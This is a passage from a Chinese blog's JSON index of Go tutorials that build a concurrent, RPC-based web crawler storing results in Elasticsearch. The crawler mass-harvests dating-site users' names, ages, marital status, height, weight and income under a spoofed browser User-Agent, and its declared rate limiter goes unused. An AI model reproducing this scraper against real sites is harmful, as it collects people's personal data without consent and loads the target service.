&#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[60]-分布式爬虫-jsonrpc抽离存储数据引擎","slug":"golang-59-crawler-rpcitemserver","date":"2019-01-25T09:49:47.000Z","updated":"2019-02-04T08:34:57.813Z","comments":true,"path":"2019/01/25/golang-59-crawler-rpcitemserver/","link":"","permalink":"https://dreamerjonson.com/2019/01/25/golang-59-crawler-rpcitemserver/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703package mainimport ( \"io/ioutil\" \"golang.org/x/net/html/charset\" \"golang.org/x/text/encoding\" \"bufio\" \"golang.org/x/text/transform\" \"golang.org/x/text/encoding/unicode\" \"log\" \"regexp\" \"strconv\" \"net/http\" \"fmt\" \"time\" \"gopkg.in/olivere/elastic.v5\" \"context\" \"net/rpc/jsonrpc\" \"net/rpc\" \"net\")var rateLimiter = time.Tick(10 * time.Millisecond)/* start Fetch.go*/func Fetch(url string)([]byte ,error)&#123; //resp,err:= http.Get(url) // //if err!=nil&#123; // return nil,err //&#125; // //defer resp.Body.Close() //if resp.StatusCode != http.StatusOK&#123; // return nil,fmt.Errorf(\"Error: status code:%d\",resp.StatusCode) //&#125; client := &amp;http.Client&#123;&#125; req, err := http.NewRequest(\"GET\", url, nil) if err != nil &#123; fmt.Printf(\"get url:%s error\",url ) return nil,fmt.Errorf(\"get url:%d error\",url) &#125; req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\") resp, err := client.Do(req) if err != nil &#123; //log.Fatalln(err) fmt.Printf(\"get url:%s error\",url ) return nil,fmt.Errorf(\"get url:%d error\",url) &#125; defer resp.Body.Close() bodyReader:= bufio.NewReader(resp.Body) e:= determineEncoding(bodyReader) utf8reader:= transform.NewReader(bodyReader,e.NewDecoder()) return ioutil.ReadAll(utf8reader)&#125;func determineEncoding(r *bufio.Reader) encoding.Encoding&#123; bytes,err := bufio.NewReader(r).Peek(1024) if err !=nil&#123; log.Printf(\"Fetcher error:%v\",err) return unicode.UTF8 &#125; e,_,_:= charset.DetermineEncoding(bytes,\"\") return e&#125;/* end Fetch.go*//* start Type.go*/type Request struct&#123; Url string ParserFunc func([]byte) ParseResult&#125;type ParseResult struct&#123; Requests []Request Items []Item&#125;type Item struct&#123; Url string Id string Type string Payload interface&#123;&#125;&#125;func NilParser([]byte) ParseResult&#123; return ParseResult&#123;&#125;&#125;/* end Type.go*//* start parser/city.go 爬取城市下每一个用户和网址*/var cityRe = regexp.MustCompile(`&lt;a href=\"(http://album.zhenai.com/u/[\\d]+)\" target=\"_blank\"&gt;([^&lt;]+)&lt;/a&gt;`)var cityUrlRe = regexp.MustCompile(`&lt;a href=\"(http://www.zhenai.com/zhenghun/[^\"]+)\"`)func ParseCity(contents []byte) ParseResult&#123; matches:= cityRe.FindAllSubmatch(contents,-1) result := ParseResult&#123;&#125; for _,m:= range matches&#123; url:=string(m[1]) name:=string(m[2]) //println(string(m[1])) //不用用户名了 //result.Items = append(result.Items,\"User:\"+string(m[2])) result.Requests = append(result.Requests,Request&#123; Url:string(m[1]), ParserFunc:func(c []byte) ParseResult&#123; return PaesrProfile( c,url,name) &#125;, &#125;) &#125; //查找城市页面下的城市链接 matches= cityUrlRe.FindAllSubmatch(contents,-1) for _,m:= range matches&#123; result.Requests = append(result.Requests,Request&#123; Url:string(m[1]), ParserFunc:ParseCity, &#125;) &#125; return result&#125;/* end parser/city.go *//* start parser/citylist.go */const cityListRe = `(http://www.zhenai.com/zhenghun/[0-9a-z]+)\"[^&gt;]*&gt;([^&lt;]+)&lt;/a&gt;`func ParseCityList(contents []byte) ParseResult&#123; re:=regexp.MustCompile(cityListRe) matches:= re.FindAllSubmatch(contents,-1) result:=ParseResult&#123;&#125; for _,m :=range matches&#123; //result.Items = append(result.Items,string(m[2])) result.Requests = append( result.Requests,Request&#123; Url:string(m[1]), ParserFunc:ParseCity, &#125;) &#125; return result&#125;/* end parser/citylist.go *//* start profile.go */type Profile struct &#123; Name string Age int Marry string Constellation string Height int Weight int Salary string&#125;func (p Profile) String() string&#123; return p.Name +\" \" + p.Marry + strconv.Itoa(p.Age) +\"olds \"+ strconv.Itoa(p.Height) + \"cm \" + strconv.Itoa(p.Weight)+ \"kg \"&#125;/* end profile.go *//* start parser/profile.go */var ageRe = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)岁&lt;/div&gt;`)var marry = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(已婚)&lt;/div&gt;`)var constellation = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(天秤座)&lt;/div&gt;`)var height =regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)cm&lt;/div&gt;`)var weight =regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)kg&lt;/div&gt;`)var salary = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;月收入:([^&lt;]+)&lt;/div&gt;`)var idRe = regexp.MustCompile(`http://album.zhenai.com/u/([\\d]+)`)//解析器 解析用户//name为上一级传递过来的func PaesrProfile(contents []byte,url string,name string) ParseResult&#123; //ioutil.WriteFile(\"test.html\",contents,0x777) //用户结构体 profile:=Profile&#123;&#125; profile.Name = name //年龄 string转换为int age,err:= strconv.Atoi(extractString(contents,ageRe)) if err==nil&#123; profile.Age = age &#125; //身高 height,err:= strconv.Atoi(extractString(contents,height)) if err==nil&#123; profile.Height = height &#125; //体重 weight,err:= strconv.Atoi(extractString(contents,weight)) if err==nil&#123; profile.Weight = weight &#125; //薪水 profile.Salary = extractString(contents,salary) //星座 profile.Constellation = extractString(contents,constellation) if extractString(contents,marry)== \"\"&#123; profile.Marry =\"未婚\" &#125;else&#123; profile.Marry =\"已婚\" &#125; result:=ParseResult&#123; Items:[]Item&#123; &#123; Url:url, Type:\"zhenai\", Id:extractString([]byte(url),idRe), Payload:profile, &#125;, &#125;, &#125; return result&#125;//封装 正则表达式匹配func extractString(contents []byte,re *regexp.Regexp) string&#123; match:=re.FindSubmatch(contents) if len(match)&gt;=2&#123; return string(match[1]) &#125;else&#123; return \"\" &#125;&#125;/* end parser/profile.go *//* start engine.go 单任务版引擎*/func Run(seeds ...Request)&#123; var requests []Request for _,r := range seeds&#123; requests = append(requests,r) &#125; for len(requests) &gt;0&#123; r:=requests[0] requests = requests[1:] //fmt.Printf(\"Fetching %s\",r.Url) body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) continue &#125; parseResult:= r.ParserFunc(body) requests = append(requests,parseResult.Requests...) for _,item:= range parseResult.Items&#123; fmt.Printf(\"Got item %s\\n\",item) &#125; &#125;&#125;//具体的工作 传递一个request，通过解析器对url进行解析func worker(r Request)(ParseResult,error)&#123; body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) return ParseResult&#123;&#125;,err &#125; return r.ParserFunc(body),nil&#125;/* start itemchan.go 存储服务器*/func ItemSaver() (chan Item,error)&#123; client,err := elastic.NewClient( elastic.SetSniff(false)) if err !=nil&#123; return nil ,err &#125; out:=make(chan Item) go func()&#123; itemCount:=0 for&#123; item:=&lt;-out //fmt.Printf(\"Item Saver: error saveing item %d,%v\",itemCount,item) log.Printf(\"Item Saversaveing item %d,%v\",itemCount,item) itemCount++ //存储到elastiicsearch err:= Save(client,item) if err!=nil&#123; log.Print(\"Item Saver: error\" + \"saveing item %v,%v\",item,err) &#125; &#125; &#125;() return out,nil&#125;func Save(client * elastic.Client,item Item) error&#123; indexServer:= client.Index().Index(\"dating_profile\").Type(item.Type).BodyJson(item) if item.Id!=\"\"&#123; indexServer.Id(item.Id) &#125; _,err := indexServer.Do(context.Background()) if err !=nil&#123; panic(err) &#125; return nil&#125;/* start itemchan.go 存储服务器*/// 并发版爬虫引擎 包含了调度器 与 工人数type ConcurrentEngine struct&#123; Scheduler Scheduler WorkerCount int //增加存储通道，有item需要存储，即发送消息到此通道，触发存储操作。 ItemChan chan Item&#125;//调度器是一个接口，扩展性type Scheduler interface &#123; //提交Request进行执行 Submit(Request) WorkerChan() chan Request WorkerReady(chan Request) Run()&#125;//并发版爬虫引擎func (e *ConcurrentEngine) Run(seeds ...Request)&#123; out:= make(chan ParseResult) //配置调度器通道 e.Scheduler.Run() //开启WorkerCount个工作 for i:=0;i&lt;e.WorkerCount;i++&#123; createWorker(e.Scheduler.WorkerChan(),out,e.Scheduler) &#125; //种子首先运行 for _,r:=range seeds&#123; e.Scheduler.Submit(r) &#125; for&#123; //out等待接受ParseResult result:=&lt;-out //打印出接收到的数据，以及个数。 for _,item:= range result.Items&#123; go func()&#123;e.ItemChan &lt;-item&#125;() &#125; //分配任务 for _,request:= range result.Requests&#123; if isDuplicate(request.Url)&#123; continue &#125; e.Scheduler.Submit(request) &#125; &#125;&#125;//存储URL、实行去掉重复URL的操作var URLstore = make(map[string]bool)func isDuplicate(url string) bool&#123; if URLstore[url]&#123; return true &#125; URLstore[url] = true return false&#125;//工作函数，逻辑是 in通道接收到request，即会调用worker函数爬每一个request中的网址，用对应的解析器。 解析完成后，将ParseResult返回给通道outfunc createWorker(in chan Request,out chan ParseResult,s Scheduler) &#123; go func()&#123; for&#123; //传递到调度器，提示可以开始工作 s.WorkerReady(in) //有任务到工作中 request := &lt;-in //开始工作 result,err:= worker(request) if err!=nil&#123; continue &#125; //工作结果返回 out &lt;-result &#125; &#125;()&#125;/* end engine.go *//* start scheduler.go 简单版调度器，用于分配工作任务 */type SimpleScheduler struct&#123; //通道 workerChan chan Request&#125;func (s *SimpleScheduler) WorkerChan() chan Request &#123; return s.workerChan&#125;func (s *SimpleScheduler) WorkerReady(chan Request) &#123;&#125;func (s *SimpleScheduler) Run() &#123; s.workerChan = make(chan Request)&#125;func ( s *SimpleScheduler) Submit( r Request) &#123; //为了防止死锁，在调度器中建立go的协程 分配任务到通道中。 go func()&#123;s.workerChan &lt;- r&#125;()&#125;/* end scheduler.go *//* start Queuescheduler.go 队列调度器，用于分配工作任务 */type QueuedScheduler struct &#123; requestChan chan Request workerChan chan chan Request&#125;func (s *QueuedScheduler) WorkerChan() chan Request &#123; return make(chan Request)&#125;//提交任务到通道，说明需要完成任务func (s *QueuedScheduler) Submit(r Request) &#123; s.requestChan &lt;-r&#125;//提交工作到通道，说明准备好工作了func (s *QueuedScheduler) WorkerReady(w chan Request)&#123; s.workerChan &lt;- w&#125;func (s * QueuedScheduler) Run()&#123; s.workerChan =make(chan chan Request) s.requestChan = make(chan Request) go func()&#123; //任务队列 var requestQ []Request //工作队列 var workQ []chan Request for&#123; var activeRequest Request var activework chan Request //即有工作又有任务，开始工作 if len(requestQ)&gt;0 &amp;&amp; len(workQ) &gt;0&#123; activework = workQ[0] activeRequest = requestQ[0] &#125; select &#123; //任务增加，添加到队列中 case r:=&lt;-s.requestChan: requestQ = append(requestQ,r) //工作增加，添加到队列中 case w:= &lt;-s.workerChan: workQ = append(workQ,w) //有工作又有任务，让工作去做任务 case activework &lt;- activeRequest: workQ = workQ[1:] requestQ=requestQ[1:] &#125; &#125; &#125;()&#125;//分布式存储服务器func ItemSaver2(host string) (chan Item,error)&#123; client,err:=Newclient(host) out:=make(chan Item) if err !=nil&#123; return nil,err &#125; go func()&#123; itemCount:=0 for&#123; item:=&lt;-out //fmt.Printf(\"Item Saver: error saveing item %d,%v\",itemCount,item) log.Printf(\"Item Saversaveing item %d,%v\",itemCount,item) itemCount++ result:=\"\" //Call RPC to save item client.Call(\"ItemSaverService.Save\",item,&amp;result) if err!=nil&#123; log.Print(\"Item Saver: error\" + \"saveing item %v,%v\",item,err) &#125; &#125; &#125;() return out,nil&#125;//抽象出的jsonrpc serverfunc ServerRpc(host string,service interface&#123;&#125;) error&#123; rpc.Register(service) listener,err:=net.Listen(\"tcp\",host) if err!=nil&#123; return err &#125; for&#123; conn,err:=listener.Accept() if err!=nil&#123; log.Printf(\"accept error:%v\",err) continue &#125; go jsonrpc.ServeConn(conn) &#125; return nil&#125;//抽象出的jsonrpc clientfunc Newclient(host string)(*rpc.Client,error)&#123; conn,err:=net.Dial(\"tcp\",host) if err!=nil&#123; return nil,err &#125; client:= jsonrpc.NewClient(conn) return client,nil&#125;type ItemSaverService struct&#123; Client *elastic.Client&#125;func (s*ItemSaverService) Save(item Item,result*string) error&#123; err:= Save(s.Client,item) log.Printf(\"Item %v saved.\",item) if err==nil&#123; *result = \"ok\" &#125;else&#123; log.Printf(\"Error save Item %v %v.\",item,err) &#125; return err&#125;/* end Queuescheduler.go 队列调度器，用于分配工作任务 */func main()&#123; //并发版爬虫+ itemchan,err := ItemSaver2(\":1234\") if err!=nil&#123; log.Panic(err) &#125; e:= ConcurrentEngine&#123; Scheduler:&amp;QueuedScheduler&#123;&#125;, WorkerCount:100, //增加存储通道 ItemChan:itemchan, &#125; e.Run(Request&#123; Url:\"http://www.zhenai.com/zhenghun\", ParserFunc:ParseCityList, &#125;) //并发调度版爬虫 //e:= ConcurrentEngine&#123; // Scheduler:&amp;QueuedScheduler&#123;&#125;, // WorkerCount:100, //&#125; // //e.Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) // ////并发版爬虫 //e:= ConcurrentEngine&#123; // Scheduler:&amp;SimpleScheduler&#123;&#125;, // WorkerCount:100, //&#125; // //e.Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) //单任务版爬虫 //Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) //paseTest()&#125; RPC服务器 12345678910111213func main() &#123; client, err := elastic.NewClient(elastic.SetSniff(false)) if err != nil &#123; panic(err) &#125; ServerRpc(&quot;:1234&quot;, &amp;ItemSaverService&#123; Client: client, &#125;)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[59]-爬虫-elastersearch数据存储","slug":"golang-58-crawler-elastersearch","date":"2019-01-25T01:10:43.000Z","updated":"2019-02-04T08:34:46.077Z","comments":true,"path":"2019/01/25/golang-58-crawler-elastersearch/","link":"","permalink":"https://dreamerjonson.com/2019/01/25/golang-58-crawler-elastersearch/","excerpt":"","text":"环境 docker docker run -d -p 9200:9200 elasticsearch:6.5.0 go接口： https://github.com/olivere/elastic 安装包：https://gopkg.in/olivere/elastic.v5 并发引擎+数据存储package mainimport ( \"io/ioutil\" \"golang.org/x/net/html/charset\" \"golang.org/x/text/encoding\" \"bufio\" \"golang.org/x/text/transform\" \"golang.org/x/text/encoding/unicode\" \"log\" \"regexp\" \"strconv\" \"net/http\" \"fmt\" \"time\" \"gopkg.in/olivere/elastic.v5\" \"context\")var rateLimiter = time.Tick(100 * time.Millisecond)/* start Fetch.go*/func Fetch(url string)([]byte ,error)&#123; //resp,err:= http.Get(url) // //if err!=nil&#123; // return nil,err //&#125; // //defer resp.Body.Close() //if resp.StatusCode != http.StatusOK&#123; // return nil,fmt.Errorf(\"Error: status code:%d\",resp.StatusCode) //&#125; client := &amp;http.Client&#123;&#125; req, err := http.NewRequest(\"GET\", url, nil) if err != nil &#123; log.Fatalln(err) &#125; req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\") resp, err := client.Do(req) if err != nil &#123; log.Fatalln(err) &#125; defer resp.Body.Close() bodyReader:= bufio.NewReader(resp.Body) e:= determineEncoding(bodyReader) utf8reader:= transform.NewReader(bodyReader,e.NewDecoder()) return ioutil.ReadAll(utf8reader)&#125;func determineEncoding(r *bufio.Reader) encoding.Encoding&#123; bytes,err := bufio.NewReader(r).Peek(1024) if err !=nil&#123; log.Printf(\"Fetcher error:%v\",err) return unicode.UTF8 &#125; e,_,_:= charset.DetermineEncoding(bytes,\"\") return e&#125;/* end Fetch.go*//* start Type.go*/type Request struct&#123; Url string ParserFunc func([]byte) ParseResult&#125;type ParseResult struct&#123; Requests []Request Items []interface&#123;&#125;&#125;func NilParser([]byte) ParseResult&#123; return ParseResult&#123;&#125;&#125;/* end Type.go*//* start parser/city.go 爬取城市下每一个用户和网址*/var cityRe = regexp.MustCompile(`&lt;a href=\"(http://album.zhenai.com/u/[\\d]+)\" target=\"_blank\"&gt;([^&lt;]+)&lt;/a&gt;`)var cityUrlRe = regexp.MustCompile(`&lt;a href=\"(http://www.zhenai.com/zhenghun/[^\"]+)\"`)func ParseCity(contents []byte) ParseResult&#123; matches:= cityRe.FindAllSubmatch(contents,-1) result := ParseResult&#123;&#125; for _,m:= range matches&#123; name:=string(m[2]) //println(string(m[1])) //不用用户名了 //result.Items = append(result.Items,\"User:\"+string(m[2])) result.Requests = append(result.Requests,Request&#123; Url:string(m[1]), ParserFunc:func(c []byte) ParseResult&#123; return PaesrProfile( c,name) &#125;, &#125;) &#125; //查找城市页面下的城市链接 matches= cityUrlRe.FindAllSubmatch(contents,-1) for _,m:= range matches&#123; result.Requests = append(result.Requests,Request&#123; Url:string(m[1]), ParserFunc:ParseCity, &#125;) &#125; return result&#125;/* end parser/city.go *//* start parser/citylist.go */const cityListRe = `(http://www.zhenai.com/zhenghun/[0-9a-z]+)\"[^&gt;]*&gt;([^&lt;]+)&lt;/a&gt;`func ParseCityList(contents []byte) ParseResult&#123; re:=regexp.MustCompile(cityListRe) matches:= re.FindAllSubmatch(contents,-1) result:=ParseResult&#123;&#125; for _,m :=range matches&#123; result.Items = append(result.Items,string(m[2])) result.Requests = append( result.Requests,Request&#123; Url:string(m[1]), ParserFunc:ParseCity, &#125;) &#125; return result&#125;/* end parser/citylist.go *//* start profile.go */type Profile struct &#123; Name string Age int Marry string Constellation string Height int Weight int Salary string&#125;func (p Profile) String() string&#123; return p.Name +\" \" + p.Marry + strconv.Itoa(p.Age) +\"olds \"+ strconv.Itoa(p.Height) + \"cm \" + strconv.Itoa(p.Weight)+ \"kg \"&#125;/* end profile.go *//* start parser/profile.go */var ageRe = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)岁&lt;/div&gt;`)var marry = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(已婚)&lt;/div&gt;`)var constellation = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([^座])+&lt;/div&gt;`)var height =regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)cm&lt;/div&gt;`)var weight =regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)kg&lt;/div&gt;`)var salary = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;月收入:([^&lt;]+)&lt;/div&gt;`)//解析器 解析用户//name为上一级传递过来的func PaesrProfile(contents []byte,name string) ParseResult&#123; //ioutil.WriteFile(\"test.html\",contents,0x777) //用户结构体 profile:=Profile&#123;&#125; profile.Name = name //年龄 string转换为int age,err:= strconv.Atoi(extractString(contents,ageRe)) if err==nil&#123; profile.Age = age &#125; //身高 height,err:= strconv.Atoi(extractString(contents,height)) if err==nil&#123; profile.Height = height &#125; //体重 weight,err:= strconv.Atoi(extractString(contents,weight)) if err==nil&#123; profile.Weight = weight &#125; //薪水 profile.Salary = extractString(contents,salary) //星座 profile.Constellation = extractString(contents,constellation) if extractString(contents,marry)== \"\"&#123; profile.Marry =\"未婚\" &#125;else&#123; profile.Marry =\"已婚\" &#125; result:=ParseResult&#123; Items:[]interface&#123;&#125;&#123;profile&#125;, &#125; return result&#125;//封装 正则表达式匹配func extractString(contents []byte,re *regexp.Regexp) string&#123; match:=re.FindSubmatch(contents) if len(match)&gt;=2&#123; return string(match[1]) &#125;else&#123; return \"\" &#125;&#125;/* end parser/profile.go *//* start engine.go 单任务版引擎*/func Run(seeds ...Request)&#123; var requests []Request for _,r := range seeds&#123; requests = append(requests,r) &#125; for len(requests) &gt;0&#123; r:=requests[0] requests = requests[1:] //fmt.Printf(\"Fetching %s\",r.Url) body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) continue &#125; parseResult:= r.ParserFunc(body) requests = append(requests,parseResult.Requests...) for _,item:= range parseResult.Items&#123; fmt.Printf(\"Got item %s\\n\",item) &#125; &#125;&#125;//具体的工作 传递一个request，通过解析器对url进行解析func worker(r Request)(ParseResult,error)&#123; body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) return ParseResult&#123;&#125;,err &#125; return r.ParserFunc(body),nil&#125;/* start itemchan.go 存储服务器*/func ItemSaver() chan interface&#123;&#125;&#123; out:=make(chan interface&#123;&#125;) go func()&#123; itemCount:=0 for&#123; item:=&lt;-out //fmt.Printf(\"Item Saver: error saveing item %d,%v\",itemCount,item) log.Printf(\"Item Saversaveing item %d,%v\",itemCount,item) itemCount++ //存储到elastiicsearch id,err:= save(item) log.Printf(\"%v\",id) if err!=nil&#123; log.Print(\"Item Saver: error\" + \"saveing item %v,%v\",item,err) &#125; &#125; &#125;() return out&#125;func save(item interface&#123;&#125;) (id string,err error)&#123; client,err := elastic.NewClient( elastic.SetSniff(false)) if err !=nil&#123; panic(err) &#125; resp,err:= client.Index().Index(\"dating_profile\").Type(\"zhenai\").BodyJson(item).Do(context.Background()) if err !=nil&#123; panic(err) &#125; return resp.Id,nil&#125;/* start itemchan.go 存储服务器*/// 并发版爬虫引擎 包含了调度器 与 工人数type ConcurrentEngine struct&#123; Scheduler Scheduler WorkerCount int //增加存储通道，有item需要存储，即发送消息到此通道，触发存储操作。 ItemChan chan interface&#123;&#125;&#125;//调度器是一个接口，扩展性type Scheduler interface &#123; //提交Request进行执行 Submit(Request) WorkerChan() chan Request WorkerReady(chan Request) Run()&#125;//并发版爬虫引擎func (e *ConcurrentEngine) Run(seeds ...Request)&#123; out:= make(chan ParseResult) //配置调度器通道 e.Scheduler.Run() //开启WorkerCount个工作 for i:=0;i&lt;e.WorkerCount;i++&#123; createWorker(e.Scheduler.WorkerChan(),out,e.Scheduler) &#125; //种子首先运行 for _,r:=range seeds&#123; e.Scheduler.Submit(r) &#125; for&#123; //out等待接受ParseResult result:=&lt;-out //打印出接收到的数据，以及个数。 for _,item:= range result.Items&#123; go func()&#123;e.ItemChan &lt;-item&#125;() &#125; //分配任务 for _,request:= range result.Requests&#123; if isDuplicate(request.Url)&#123; continue &#125; e.Scheduler.Submit(request) &#125; &#125;&#125;//存储URL、实行去掉重复URL的操作var URLstore = make(map[string]bool)func isDuplicate(url string) bool&#123; if URLstore[url]&#123; return true &#125; URLstore[url] = true return false&#125;//工作函数，逻辑是 in通道接收到request，即会调用worker函数爬每一个request中的网址，用对应的解析器。 解析完成后，将ParseResult返回给通道outfunc createWorker(in chan Request,out chan ParseResult,s Scheduler) &#123; go func()&#123; for&#123; //传递到调度器，提示可以开始工作 s.WorkerReady(in) //有任务到工作中 request := &lt;-in //开始工作 result,err:= worker(request) if err!=nil&#123; continue &#125; //工作结果返回 out &lt;-result &#125; &#125;()&#125;/* end engine.go *//* start scheduler.go 简单版调度器，用于分配工作任务 */type SimpleScheduler struct&#123; //通道 workerChan chan Request&#125;func (s *SimpleScheduler) WorkerChan() chan Request &#123; return s.workerChan&#125;func (s *SimpleScheduler) WorkerReady(chan Request) &#123;&#125;func (s *SimpleScheduler) Run() &#123; s.workerChan = make(chan Request)&#125;func ( s *SimpleScheduler) Submit( r Request) &#123; //为了防止死锁，在调度器中建立go的协程 分配任务到通道中。 go func()&#123;s.workerChan &lt;- r&#125;()&#125;/* end scheduler.go *//* start Queuescheduler.go 队列调度器，用于分配工作任务 */type QueuedScheduler struct &#123; requestChan chan Request workerChan chan chan Request&#125;func (s *QueuedScheduler) WorkerChan() chan Request &#123; return make(chan Request)&#125;//提交任务到通道，说明需要完成任务func (s *QueuedScheduler) Submit(r Request) &#123; s.requestChan &lt;-r&#125;//提交工作到通道，说明准备好工作了func (s *QueuedScheduler) WorkerReady(w chan Request)&#123; s.workerChan &lt;- w&#125;func (s * QueuedScheduler) Run()&#123; s.workerChan =make(chan chan Request) s.requestChan = make(chan Request) go func()&#123; //任务队列 var requestQ []Request //工作队列 var workQ []chan Request for&#123; var activeRequest Request var activework chan Request //即有工作又有任务，开始工作 if len(requestQ)&gt;0 &amp;&amp; len(workQ) &gt;0&#123; activework = workQ[0] activeRequest = requestQ[0] &#125; select &#123; //任务增加，添加到队列中 case r:=&lt;-s.requestChan: requestQ = append(requestQ,r) //工作增加，添加到队列中 case w:= &lt;-s.workerChan: workQ = append(workQ,w) //有工作又有任务，让工作去做任务 case activework &lt;- activeRequest: workQ = workQ[1:] requestQ=requestQ[1:] &#125; &#125; &#125;()&#125;/* end Queuescheduler.go 队列调度器，用于分配工作任务 */func main()&#123; e:= ConcurrentEngine&#123; Scheduler:&amp;QueuedScheduler&#123;&#125;, WorkerCount:100, //增加存储通道 ItemChan:ItemSaver(), &#125; e.Run(Request&#123; Url:\"http://www.zhenai.com/zhenghun/shanghai\", ParserFunc:ParseCity, &#125;) //并发调度版爬虫 //e:= ConcurrentEngine&#123; // Scheduler:&amp;QueuedScheduler&#123;&#125;, // WorkerCount:100, //&#125; // //e.Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) // ////并发版爬虫 //e:= ConcurrentEngine&#123; // Scheduler:&amp;SimpleScheduler&#123;&#125;, // WorkerCount:100, //&#125; // //e.Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) //单任务版爬虫 //Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) //paseTest()&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"docker解决国内网络拉取镜像缓慢问题","slug":"docker-mirror","date":"2019-01-24T10:52:34.000Z","updated":"2019-02-12T14:55:54.834Z","comments":true,"path":"2019/01/24/docker-mirror/","link":"","permalink":"https://dreamerjonson.com/2019/01/24/docker-mirror/","excerpt":"","text":"众所周知，由于国内网路问题，不能拉有些docker中的镜像。 解决方法可以使用国内的镜像加速： https://www.daocloud.io/mirror","categories":[{"name":"docker","slug":"docker","permalink":"https://dreamerjonson.com/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://dreamerjonson.com/tags/docker/"}]},{"title":"go语言渐入佳境[58]-爬虫-调度器优化","slug":"golang-57-crawler-schedulerup","date":"2019-01-24T07:51:15.000Z","updated":"2019-02-04T08:34:39.772Z","comments":true,"path":"2019/01/24/golang-57-crawler-schedulerup/","link":"","permalink":"https://dreamerjonson.com/2019/01/24/golang-57-crawler-schedulerup/","excerpt":"","text":"增强功能：获取城市下城市链接以及去重操作package mainimport ( \"io/ioutil\" \"golang.org/x/net/html/charset\" \"golang.org/x/text/encoding\" \"bufio\" \"golang.org/x/text/transform\" \"golang.org/x/text/encoding/unicode\" \"log\" \"regexp\" \"strconv\" \"net/http\" \"fmt\" \"time\")var rateLimiter = time.Tick(100 * time.Millisecond)/* start Fetch.go*/func Fetch(url string)([]byte ,error)&#123; //resp,err:= http.Get(url) // //if err!=nil&#123; // return nil,err //&#125; // //defer resp.Body.Close() //if resp.StatusCode != http.StatusOK&#123; // return nil,fmt.Errorf(\"Error: status code:%d\",resp.StatusCode) //&#125; client := &amp;http.Client&#123;&#125; req, err := http.NewRequest(\"GET\", url, nil) if err != nil &#123; log.Fatalln(err) &#125; req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\") resp, err := 